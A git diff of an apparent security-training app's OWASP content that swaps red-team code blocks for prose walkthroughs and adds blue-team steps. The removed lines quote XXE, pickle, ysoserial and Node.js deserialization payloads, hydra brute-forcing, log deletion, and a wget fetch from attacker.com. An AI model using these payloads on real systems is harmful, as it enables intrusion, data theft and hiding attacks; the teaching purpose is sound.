         <h5>2. Azure Key Vault Integration</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 var client = new SecretClient(
@@ -539,6 +550,28 @@ var client = new SecretClient(
 
 KeyVaultSecret secret = await client.GetSecretAsync("secret-name");
         </code></pre>
+      `,
+      blueTeamMac: `
+        <h4>Blue Team Walkthrough (Mac/PHP)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a PHP app on Mac. Your goal is to detect and prevent sensitive data exposure and cryptographic failures.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all access to sensitive data, failed decryption attempts, and use of weak cryptography. Use system logs and tools like OSSEC to track sensitive data access.</li>
+          <li><strong>Alert:</strong> Set up alerts for access to sensitive files, use of deprecated crypto algorithms, or failed encryption/decryption events.</li>
+          <li><strong>Investigate:</strong> Review logs for unauthorized access, plaintext secrets, or use of weak crypto. Correlate with user actions and privilege levels.</li>
+          <li><strong>Harden:</strong> Use environment variables for secrets, enforce strong encryption, and scan for hardcoded secrets in code repos.</li>
+          <li><strong>Learning Moment:</strong> Simulate a secrets scan and see what your monitoring tools catch.</li>
+        </ol>
+      `,
+      blueTeamLinux: `
+        <h4>Blue Team Walkthrough (Linux)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Linux app. Your goal is to detect and prevent sensitive data exposure and cryptographic failures.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use auditd, OSSEC, or ELK Stack to monitor access to sensitive files, failed decryption attempts, and use of weak cryptography.</li>
+          <li><strong>Alert:</strong> Set up alerts for access to sensitive files, use of deprecated crypto algorithms, or failed encryption/decryption events.</li>
+          <li><strong>Investigate:</strong> Review logs for unauthorized access, plaintext secrets, or use of weak crypto. Correlate with user actions and privilege levels.</li>
+          <li><strong>Harden:</strong> Use environment variables for secrets, enforce strong encryption, and scan for hardcoded secrets in code repos.</li>
+          <li><strong>Learning Moment:</strong> Simulate a secrets scan and see what your monitoring tools catch.</li>
+        </ol>
       `
     },
 
@@ -547,49 +580,36 @@ KeyVaultSecret secret = await client.GetSecretAsync("secret-name");
       content: `
         <h3>XXE Attack Overview</h3>
         <p>
-          XML External Entity attacks occur when XML parsers process external entity references.
-          This can lead to data disclosure, denial of service, or server-side request forgery.
+          XXE vulnerabilities can lead to data disclosure, denial of service, and server-side request forgery.
         </p>
+        <ul>
+          <li>Disable XML external entity processing</li>
+          <li>Use safe XML parsers and configurations</li>
+          <li>Validate and sanitize XML input</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        
-        <h5>1. Basic XXE Payloads</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# File disclosure
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<foo>&xxe;</foo>
-
-# SSRF via XXE
-<!DOCTYPE foo [
-<!ENTITY xxe SYSTEM "http://internal-server/secret" >]>
-<foo>&xxe;</foo>
-
-# DoS via billion laughs
-<!DOCTYPE data [
-<!ENTITY a0 "dos" >
-<!ENTITY a1 "&a0;&a0;&a0;&a0;" >
-<!ENTITY a2 "&a1;&a1;&a1;&a1;" >
-]>
-        </code></pre>
-
-        <h5>2. Advanced XXE Testing</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Using XXEinjector
-ruby XXEinjector.rb --host=192.168.0.2 --path=/etc/passwd --file=/tmp/req.txt
-
-# Out-of-band XXE
-<!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
-%xxe;]>
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for XXE vulnerabilities. Your goal is to determine if external entities are being processed in XML input.</p>
+        <ol>
+          <li><strong>Identify XML Input Points:</strong> Look for places where XML input is processed (e.g., XML parsing, API endpoints).</li>
+          <li><strong>Test for XXE:</strong> Enter an external entity payload in XML input fields and observe error messages or unexpected results.</li>
+          <li><strong>Confirm Vulnerability:</strong> Verify if the external entity is being processed.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>XXEinjector</strong> for automated testing.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you extract sensitive data? What happens if you use different payloads?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows/.NET)</h4>
-        
+        <h4>Blue Team Walkthrough (Windows/.NET)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a .NET app. Your goal is to detect and prevent XXE (XML External Entity) attacks.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all XML parsing errors and unexpected external requests. Use Windows Event Logs and your SIEM to track XML parsing activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for XML parsing errors, external entity references, or unexpected outbound requests from the app server.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious XML input, failed parsing, or external requests. Correlate with user actions and input sources.</li>
+          <li><strong>Harden:</strong> Disable DTD processing, use safe XML parsers, and validate all XML input (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate XXE payloads in a test app and see if your monitoring catches them.</li>
+        </ol>
         <h5>1. Safe XML Parsing</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Disable DTD processing
@@ -602,7 +622,6 @@ using (XmlReader reader = XmlReader.Create(stream, settings)) {
     # Parse XML safely
 }
         </code></pre>
-
         <h5>2. Web.config Security</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 <configuration>
@@ -613,8 +632,15 @@ using (XmlReader reader = XmlReader.Create(stream, settings)) {
         </code></pre>
       `,
       blueTeamMac: `
-        <h4>Blue Team Protection (Mac/PHP)</h4>
-        
+        <h4>Blue Team Walkthrough (Mac/PHP)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a PHP app on Mac. Your goal is to detect and prevent XXE attacks.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all XML parsing errors and unexpected external requests. Use system logs and tools like OSSEC to track XML parsing activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for XML parsing errors, external entity references, or unexpected outbound requests from the app server.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious XML input, failed parsing, or external requests. Correlate with user actions and input sources.</li>
+          <li><strong>Harden:</strong> Disable external entities, use safe XML parsing options, and validate all XML input (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate XXE payloads in a test app and see if your monitoring catches them.</li>
+        </ol>
         <h5>1. libxml Security</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Disable external entities
@@ -624,7 +650,6 @@ libxml_disable_entity_loader(true);
 $xml = simplexml_load_string($xmlstr, 'SimpleXMLElement', 
     LIBXML_NOENT | LIBXML_NOCDATA);
         </code></pre>
-
         <h5>2. PHP Configuration</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # php.ini settings
@@ -632,8 +657,15 @@ libxml.disable_entity_loader = On
         </code></pre>
       `,
       blueTeamLinux: `
-        <h4>Blue Team Protection (Linux/Node.js)</h4>
-        
+        <h4>Blue Team Walkthrough (Linux/Node.js)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Node.js app on Linux. Your goal is to detect and prevent XXE attacks.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use auditd, OSSEC, or ELK Stack to monitor XML parsing errors and unexpected external requests.</li>
+          <li><strong>Alert:</strong> Set up alerts for XML parsing errors, external entity references, or unexpected outbound requests from the app server.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious XML input, failed parsing, or external requests. Correlate with user actions and input sources.</li>
+          <li><strong>Harden:</strong> Use safe XML parser configs, disable external entities, and validate all XML input (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate XXE payloads in a test app and see if your monitoring catches them.</li>
+        </ol>
         <h5>1. XML Parser Configuration</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Using xml2js safely
@@ -646,7 +678,6 @@ parser.parseString(xml, (err, result) => {
   # Handle parsed XML
 });
         </code></pre>
-
         <h5>2. ModSecurity Rules</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Detect XXE attempts
@@ -661,41 +692,36 @@ SecRule REQUEST_BODY "@contains <!ENTITY" \
       content: `
         <h3>Security Misconfiguration Overview</h3>
         <p>
-          Security misconfiguration happens when security settings are defined, implemented, 
-          or maintained using insecure values. This is one of the most common vulnerabilities.
+          Security misconfiguration happens when security settings are defined, implemented, or maintained using insecure values. This is one of the most common vulnerabilities.
         </p>
+        <ul>
+          <li>Use secure default configurations</li>
+          <li>Remove unused features and frameworks</li>
+          <li>Keep all systems and dependencies up to date</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        
-        <h5>1. Configuration Discovery</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Directory enumeration
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-
-# Default credentials
-hydra -L users.txt -P passes.txt target.com http-post-form
-
-# Port scanning
-nmap -sV -sC target.com
-        </code></pre>
-
-        <h5>2. Common Misconfigurations</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Check for debug endpoints
-curl http://target.com/debug/vars
-curl http://target.com/phpinfo.php
-
-# Test CORS misconfiguration
-curl -H "Origin: http://evil.com" -I http://target.com/api
-
-# Check security headers
-curl -I http://target.com
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for security misconfiguration. Your goal is to determine if common security practices are being followed.</p>
+        <ol>
+          <li><strong>Identify Configuration Points:</strong> Look for places where security settings are defined (e.g., web.config, .htaccess, environment variables).</li>
+          <li><strong>Test for Misconfiguration:</strong> Try accessing debug endpoints, checking security headers, or testing CORS misconfiguration.</li>
+          <li><strong>Confirm Vulnerability:</strong> Verify if the application is vulnerable to common security misconfigurations.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>curl</strong> for automated testing.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you find more misconfigurations? What happens if you use different tools or techniques?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows/IIS)</h4>
-        
+        <h4>Blue Team Walkthrough (Windows/IIS)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Windows/IIS app. Your goal is to detect and prevent security misconfigurations.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all configuration changes, failed logins, and access to debug endpoints. Use Windows Event Logs and your SIEM to track configuration activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for changes to web.config, access to debug endpoints, or use of default credentials.</li>
+          <li><strong>Investigate:</strong> Review logs for unauthorized changes, access to sensitive endpoints, or use of weak/default settings.</li>
+          <li><strong>Harden:</strong> Enforce secure defaults, remove unused features, and keep systems up to date (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate a misconfiguration in a test app and see if your monitoring catches it.</li>
+        </ol>
         <h5>1. IIS Hardening</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 <!-- web.config security -->
@@ -712,7 +738,6 @@ curl -I http://target.com
   </system.webServer>
 </configuration>
         </code></pre>
-
         <h5>2. Security Headers</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 <httpProtocol>
@@ -725,8 +750,15 @@ curl -I http://target.com
         </code></pre>
       `,
       blueTeamMac: `
-        <h4>Blue Team Protection (Mac/Apache)</h4>
-        
+        <h4>Blue Team Walkthrough (Mac/Apache)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a PHP app on Mac/Apache. Your goal is to detect and prevent security misconfigurations.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all configuration changes, failed logins, and access to debug endpoints. Use Apache logs and tools like OSSEC to track configuration activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for changes to .htaccess, access to debug endpoints, or use of default credentials.</li>
+          <li><strong>Investigate:</strong> Review logs for unauthorized changes, access to sensitive endpoints, or use of weak/default settings.</li>
+          <li><strong>Harden:</strong> Enforce secure defaults, remove unused features, and keep systems up to date (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate a misconfiguration in a test app and see if your monitoring catches it.</li>
+        </ol>
         <h5>1. Apache Security Configuration</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Security headers in .htaccess
@@ -744,7 +776,6 @@ Options -Indexes
     Deny from all
 </FilesMatch>
         </code></pre>
-
         <h5>2. PHP Hardening</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # php.ini security settings
@@ -756,8 +787,15 @@ allow_url_fopen = Off
         </code></pre>
       `,
       blueTeamLinux: `
-        <h4>Blue Team Protection (Linux/Nginx)</h4>
-        
+        <h4>Blue Team Walkthrough (Linux/Nginx)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Linux/Nginx app. Your goal is to detect and prevent security misconfigurations.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use auditd, OSSEC, or ELK Stack to monitor configuration changes, failed logins, and access to debug endpoints.</li>
+          <li><strong>Alert:</strong> Set up alerts for changes to nginx.conf, access to debug endpoints, or use of default credentials.</li>
+          <li><strong>Investigate:</strong> Review logs for unauthorized changes, access to sensitive endpoints, or use of weak/default settings.</li>
+          <li><strong>Harden:</strong> Enforce secure defaults, remove unused features, and keep systems up to date (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate a misconfiguration in a test app and see if your monitoring catches it.</li>
+        </ol>
         <h5>1. Nginx Hardening</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # nginx.conf security settings
@@ -776,7 +814,6 @@ server {
     ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256;ECDHE-RSA-AES128-GCM-SHA256;
 }
         </code></pre>
-
         <h5>2. System Hardening</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Update package lists
@@ -801,41 +838,36 @@ echo "tmpfs     /run/shm     tmpfs     defaults,noexec,nosuid     0     0" >> /e
       content: `
         <h3>Insecure Deserialization Overview</h3>
         <p>
-          Insecure deserialization occurs when applications deserialize untrusted input,
-          potentially leading to remote code execution or privilege escalation.
+          Insecure deserialization can lead to remote code execution or privilege escalation if untrusted input is deserialized.
         </p>
+        <ul>
+          <li>Use digital signatures to verify integrity</li>
+          <li>Use safe deserializers</li>
+          <li>Validate all serialized data from untrusted sources</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        
-        <h5>1. Basic Deserialization Testing</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Python pickle exploitation
-import pickle
-import os
-
-class Evil(object):
-    def __reduce__(self):
-        return (os.system, ('whoami',))
-
-print(pickle.dumps(Evil()))
-
-# PHP serialization attack
-O:4:"User":2:{s:4:"name":s:6:"hacker":s:5:"admin":b:1;}
-        </code></pre>
-
-        <h5>2. Advanced Techniques</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Using ysoserial
-java -jar ysoserial.jar CommonsCollections1 'wget http://attacker.com/shell.php' > payload.bin
-
-# Node.js deserialization
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()"}
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for insecure deserialization vulnerabilities. Your goal is to determine if untrusted input is being deserialized.</p>
+        <ol>
+          <li><strong>Identify Deserialization Points:</strong> Look for places where serialized data is being processed (e.g., API endpoints, file uploads).</li>
+          <li><strong>Test for Deserialization:</strong> Enter a serialized payload in input fields and observe error messages or unexpected results.</li>
+          <li><strong>Confirm Vulnerability:</strong> Verify if the serialized data is being executed.</li>
+          <li><strong>Automate Testing:</strong> Use tools like <strong>ysoserial</strong> for automated testing.</li>
+          <li><strong>Learning Moment:</strong> Try these steps on a safe test environment like <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> or <a href="http://dvwa.co.uk/" target="_blank">DVWA</a>.</li>
+        </ol>
+        <p><em>What to try next:</em> Can you execute code? What happens if you use different payloads?</p>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows/.NET)</h4>
-        
+        <h4>Blue Team Walkthrough (Windows/.NET)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a .NET app. Your goal is to detect and prevent insecure deserialization attacks.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all deserialization errors, unexpected object types, and failed input validation. Use Windows Event Logs and your SIEM to track deserialization activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for deserialization errors, use of unsafe deserializers, or unexpected object types.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious deserialization activity, correlate with user actions and input sources.</li>
+          <li><strong>Harden:</strong> Use safe deserializers, validate all input, and avoid deserializing untrusted data (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate deserialization attacks in a test app and see if your monitoring catches them.</li>
+        </ol>
         <h5>1. Safe Deserialization</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Use JSON instead of BinaryFormatter
@@ -846,7 +878,6 @@ var options = new JsonSerializerOptions
 
 var obj = JsonSerializer.Deserialize<SafeType>(json, options);
         </code></pre>
-
         <h5>2. Input Validation</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Validate before deserializing
@@ -862,8 +893,15 @@ public partial class JsonContext : JsonSerializerContext
         </code></pre>
       `,
       blueTeamMac: `
-        <h4>Blue Team Protection (Mac/PHP)</h4>
-        
+        <h4>Blue Team Walkthrough (Mac/PHP)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a PHP app on Mac. Your goal is to detect and prevent insecure deserialization attacks.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all deserialization errors, unexpected object types, and failed input validation. Use system logs and tools like OSSEC to track deserialization activity.</li>
+          <li><strong>Alert:</strong> Set up alerts for deserialization errors, use of unsafe deserializers, or unexpected object types.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious deserialization activity, correlate with user actions and input sources.</li>
+          <li><strong>Harden:</strong> Use safe deserializers, validate all input, and avoid deserializing untrusted data (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate deserialization attacks in a test app and see if your monitoring catches them.</li>
+        </ol>
         <h5>1. Safe Deserialization in PHP</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Use JSON instead of unserialize
@@ -872,7 +910,6 @@ $data = json_decode($input, true);
 # If unserialize is needed, use allowed_classes
 $data = unserialize($input, ['allowed_classes' => ['SafeClass']]);
         </code></pre>
-
         <h5>2. Input Validation</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Validate structure before processing
@@ -889,8 +926,15 @@ function validateInput($input) {
         </code></pre>
       `,
       blueTeamLinux: `
-        <h4>Blue Team Protection (Linux/Node.js)</h4>
-        
+        <h4>Blue Team Walkthrough (Linux/Node.js)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Node.js app on Linux. Your goal is to detect and prevent insecure deserialization attacks.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use auditd, OSSEC, or ELK Stack to monitor deserialization errors, unexpected object types, and failed input validation.</li>
+          <li><strong>Alert:</strong> Set up alerts for deserialization errors, use of unsafe deserializers, or unexpected object types.</li>
+          <li><strong>Investigate:</strong> Review logs for suspicious deserialization activity, correlate with user actions and input sources.</li>
+          <li><strong>Harden:</strong> Use safe deserialization practices, validate all input, and avoid deserializing untrusted data (see code below).</li>
+          <li><strong>Learning Moment:</strong> Simulate deserialization attacks in a test app and see if your monitoring catches them.</li>
+        </ol>
         <h5>1. Safe Deserialization Practices</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Use JSON.parse instead of eval
@@ -908,7 +952,6 @@ function safeDeserialize(input) {
     return parsed;
 }
         </code></pre>
-
         <h5>2. Security Headers and Configurations</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
 # Express security middleware
@@ -929,139 +972,135 @@ app.use((req, res, next) => {
         </code></pre>
       `
     },
-
-    knownVulnComponents: {
-      title: "A06:2021 - Vulnerable and Outdated Components",
+    insecureSubmission: {
+      title: "A02:2021 - Insecure Submission (Cleartext Transmission)",
       content: `
-        <h3>Vulnerable Components Overview</h3>
+        <h3>Insecure Submission Overview</h3>
         <p>
-          Using components with known vulnerabilities can lead to various attacks.
-          Regular updates and security audits are essential.
+          Submitting sensitive data over HTTP exposes it to interception and tampering by attackers.
         </p>
+        <ul>
+          <li>Always use HTTPS for all data submissions</li>
+          <li>Implement HSTS headers to enforce HTTPS</li>
+          <li>Educate users to look for secure connections</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Kali Linux Testing Guide</h4>
-        
-        <h5>1. Dependency Analysis</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Using OWASP Dependency-Check
-dependency-check --scan /path/to/application
-
-# Using Retire.js
-retire --path /path/to/webapp
-
-# Using npm audit
-npm audit
-yarn audit
-
-# Using Snyk
-snyk test
-        </code></pre>
-
-        <h5>2. Version Fingerprinting</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Wappalyzer CLI
-wappalyzer https://target.com
-
-# Builtwith
-curl -A "Mozilla/5.0" https://api.builtwith.com/v14/api.json?KEY=XXX&LOOKUP=target.com
-
-# Manual header inspection
-curl -I https://target.com
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for insecure data submission. Your goal is to determine if sensitive data is sent over HTTP.</p>
+        <ol>
+          <li><strong>Identify Submission Points:</strong> Look for forms or API calls that use HTTP instead of HTTPS.</li>
+          <li><strong>Test for Interception:</strong> Use a proxy (e.g., Burp Suite) to intercept traffic and check for cleartext data.</li>
+          <li><strong>Confirm Vulnerability:</strong> Verify if credentials or sensitive data are visible in network traffic.</li>
+          <li><strong>Automate Testing:</strong> Use tools like SSL Labs or testssl.sh to check for HTTPS enforcement.</li>
+          <li><strong>Learning Moment:</strong> Try submitting a form over HTTP and see if you can intercept the data.</li>
+        </ol>
       `,
-      blueTeamWindows: `
-        <h4>Blue Team Protection (Windows/.NET)</h4>
-        
-        <h5>1. NuGet Security</h5>
+      blueTeam: `
+        <h4>Blue Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a defender for a web app. Your goal is to detect and prevent insecure data submission.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Log all HTTP requests to sensitive endpoints. Use web server logs and SIEM tools.</li>
+          <li><strong>Alert:</strong> Set up alerts for HTTP requests to login or sensitive pages.</li>
+          <li><strong>Investigate:</strong> Review logs for repeated HTTP access to sensitive endpoints.</li>
+          <li><strong>Harden:</strong> Redirect all HTTP traffic to HTTPS, set HSTS headers, and disable HTTP where possible.</li>
+          <li><strong>Learning Moment:</strong> Simulate HTTP submissions and verify your monitoring catches them.</li>
+        </ol>
+        <h5>1. Enforce HTTPS</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Install security scanning tools
-dotnet tool install --global security-scan
-
-# Add package security scanning
-<PropertyGroup>
-  <RunSecurityScan>true</RunSecurityScan>
-</PropertyGroup>
-
-# Use central package management
-<PackageVersion Include="Newtonsoft.Json" Version="13.0.1" />
+# Example Nginx redirect
+server {
+    listen 80;
+    server_name example.com;
+    return 301 https://$host$request_uri;
+}
         </code></pre>
-
-        <h5>2. Automated Updates</h5>
+        <h5>2. HSTS Header</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Enable Dependabot in .github/dependabot.yml
-version: 2
-updates:
-  - package-ecosystem: "nuget"
-    directory: "/"
-    schedule:
-      interval: "daily"
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
         </code></pre>
       `
     },
-
-    // New entry for A09:2021 - Security Logging and Monitoring Failures
     securityLogging: {
       title: "A09:2021 - Security Logging and Monitoring Failures",
       content: `
-        <h3>Security Logging and Monitoring Failures Overview</h3>
+        <h3>Security Logging and Monitoring Overview</h3>
         <p>
-          Inadequate logging and monitoring practices can delay the detection of security incidents,
-          enabling attackers to remain undetected and prolonging the time to respond to breaches.
-          Comprehensive logging and real-time monitoring are vital for effective incident response.
+          Insufficient logging and monitoring can prevent detection of breaches and hinder incident response.
         </p>
+        <ul>
+          <li>Log all authentication, access control, and input validation failures</li>
+          <li>Use centralized log management and monitoring</li>
+          <li>Protect logs from tampering and ensure proper retention</li>
+        </ul>
       `,
       redTeam: `
-        <h4>Red Team Testing Guide</h4>
-        <h5>1. Log Tampering and Injection</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Attempt to delete or modify log files to conceal malicious activities
-rm -f /var/log/auth.log
-echo "Unauthorized access detected at $(date)" >> /var/log/app.log
-        </code></pre>
-        <h5>2. Simulated Breach</h5>
-        <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Trigger events that should be logged and verify if alerts are generated
-curl http://target.com/admin -H "User-Agent: RedTeamScanner"
-        </code></pre>
+        <h4>Red Team Walkthrough</h4>
+        <p><strong>Scenario:</strong> You are a security tester assessing a web application for logging failures. Your goal is to determine if attacks are logged and monitored.</p>
+        <ol>
+          <li><strong>Trigger Events:</strong> Attempt failed logins, access control violations, and input validation errors.</li>
+          <li><strong>Check Logs:</strong> Review application and server logs to see if events are recorded.</li>
+          <li><strong>Confirm Gaps:</strong> Identify missing or incomplete log entries for security events.</li>
+          <li><strong>Automate Testing:</strong> Use log analysis tools to scan for missing events.</li>
+          <li><strong>Learning Moment:</strong> Try simulating attacks and see if your actions are logged and alerted on.</li>
+        </ol>
       `,
       blueTeamWindows: `
-        <h4>Blue Team Protection (Windows)</h4>
-        <h5>1. Enable Detailed Audit Logging</h5>
+        <h4>Blue Team Walkthrough (Windows/.NET)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a .NET or Windows app. Your goal is to ensure all critical events are logged and monitored.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use Windows Event Logs and a SIEM (e.g., Splunk, Sentinel) to collect logs from all systems.</li>
+          <li><strong>Alert:</strong> Set up alerts for failed logins, access control violations, and suspicious activity using Windows Event Forwarding or SIEM rules.</li>
+          <li><strong>Investigate:</strong> Review logs for patterns of attack or unusual activity, such as repeated failed logins or privilege escalation attempts.</li>
+          <li><strong>Harden:</strong> Ensure logs are protected with NTFS permissions, enable log retention policies, and use write-once storage if possible.</li>
+          <li><strong>Learning Moment:</strong> Simulate attacks and verify your monitoring and alerting works.</li>
+        </ol>
+        <h5>1. Enable Audit Policies</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Configure audit policies to capture detailed security events
-auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+# Enable auditing for logon events
+AuditPol /set /category:"Logon/Logoff" /success:enable /failure:enable
         </code></pre>
-        <h5>2. Centralize and Monitor Logs</h5>
+        <h5>2. Forward Logs to SIEM</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Use Windows Event Forwarding or a SIEM solution for centralized log monitoring
-wecutil qc /q
+# Use Windows Event Forwarding or an agent (e.g., Splunk Universal Forwarder)
         </code></pre>
       `,
       blueTeamMac: `
-        <h4>Blue Team Protection (Mac)</h4>
-        <h5>1. Centralize Syslog</h5>
+        <h4>Blue Team Walkthrough (Mac)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Mac app. Your goal is to ensure all critical events are logged and monitored.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use the macOS Unified Logging System (log command) and syslog for application and system logs.</li>
+          <li><strong>Alert:</strong> Set up scripts or monitoring tools (e.g., osquery, Splunk) to alert on failed logins, sudo attempts, and suspicious activity.</li>
+          <li><strong>Investigate:</strong> Review logs for repeated failed logins, privilege escalation, or unusual process activity.</li>
+          <li><strong>Harden:</strong> Protect log files with proper permissions and use log rotation (newsyslog) to retain logs.</li>
+          <li><strong>Learning Moment:</strong> Simulate attacks and verify your monitoring and alerting works.</li>
+        </ol>
+        <h5>1. View System Logs</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Forward system logs to a centralized server
-*.* @logserver.example.com
+log show --predicate 'eventMessage contains "login"' --info
         </code></pre>
-        <h5>2. Setup Log Monitoring</h5>
+        <h5>2. Log Rotation</h5>
         <pre class="bg-gray-900 p-2 text-gray-100 rounded"><code>
-# Employ tools like OSQuery to monitor log integrity and detect anomalies
-brew install osquery
+# /etc/newsyslog.conf controls log rotation
         </code></pre>
       `,
       blueTeamLinux: `
-        <h4>Blue Team Protection (Linux)</h4>
-        <h5>1. Centralize Logs</h5>
+        <h4>Blue Team Walkthrough (Linux)</h4>
+        <p><strong>Scenario:</strong> You are a defender for a Linux app. Your goal is to ensure all critical events are logged and monitored.</p>
+        <ol>
+          <li><strong>Monitor:</strong> Use syslog, journald, or rsyslog to collect logs from all systems and applications.</li>
+          <li><strong>Alert:</strong> Set up log monitoring tools (e.g., ELK Stack, Graylog, OSSEC) to alert on failed logins, sudo attempts, and suspicious activity.</li>
+          <li><strong>Investigate:</strong> Review logs for repeated failed logins, privilege escalation, or unusual process activity.</li>
